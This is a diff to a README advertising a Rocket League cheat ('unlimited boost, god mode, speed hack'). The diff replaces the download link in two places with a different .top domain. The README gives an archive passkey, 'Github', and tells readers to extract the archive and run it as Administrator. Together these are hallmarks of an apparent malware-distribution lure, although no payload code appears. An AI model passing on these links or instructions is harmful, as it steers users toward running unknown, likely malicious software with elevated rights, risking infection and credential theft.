@@ -6,7 +6,7 @@ Rocket League external hack with unlimited boost, god mode, speed hack, teleport
 
 ## ⬇️ Download
 
-**[CLICK](https://gitappdown.top/)**
+**[CLICK](https://gitdownapply.top)**
 
 Archive passkey: `Github`
 
@@ -77,7 +77,7 @@ Based on community mods like BakkesMod and various Rocket League trainers.
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitappdown.top/)** to download.
+1. Click **[CLICK](https://gitdownapply.top)** to download.
 2. Extract the archive.
 3. Launch Rocket League.
 4. Run the hack **as Administrator**.
